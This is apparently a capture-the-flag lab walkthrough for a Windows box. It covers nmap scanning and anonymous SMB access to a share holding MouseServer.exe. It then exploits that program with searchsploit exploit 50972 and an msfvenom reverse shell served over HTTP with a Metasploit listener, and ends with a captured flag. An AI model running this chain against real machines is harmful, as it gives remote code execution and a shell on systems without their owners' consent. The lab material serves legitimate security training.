First perform the nmap scannning
nmap -sS -sC -T4 192.168.172.10
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
Host script results:
| smb2-time: 
|   date: 2024-04-18T13:22:33
|_  start_date: 2024-03-31T21:10:04
|_clock-skew: mean: 2h20m01s, deviation: 4h02m32s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 10 Pro 15063 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: remotemouse
|   NetBIOS computer nam e: REMOTEMOUSE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-04-18T06:22:34-07:00

It shows SMB security mode is using guest account and no message signing required.
We can use SMBclient to access it and see what inside the smb
References: https://upcloud.com/resources/tutorials/transfer-files-linux-samba

smbclient -L 192.168.172.10
password: {blank just keep enter}
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
offsec          Disk      
Users           Disk

smbclient \\\\192.168.172.10\\offsec
Inside the offsec\Downloads share folder there is a "MouseServer.exe" file which is exploitable. Lets run it and use searchsploit to exploit
smb: \Downloads\> open MouseServer.exe

searchsploit -m 50972

Use msfvenom to create reverse payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=6666 -f exe > reverse.exe
python3 -m http.server 80

Use msfconsole to listen
Use exploit/multi/handler
set lhost <ip>
set lport 6666
run -j #Listen to background
sessions 1

After understand the script we need to make sure payload prepared
USAGE: python 50972.py <target-ip> <local-http-server-ip> <payload-name>
python3 50972.py 192.168.172.10 192.168.45.237 reverse.exe

Go to offsec user desktop and type root.txt
OS{8ad99b82cc4311483961874a5f0c8be8}






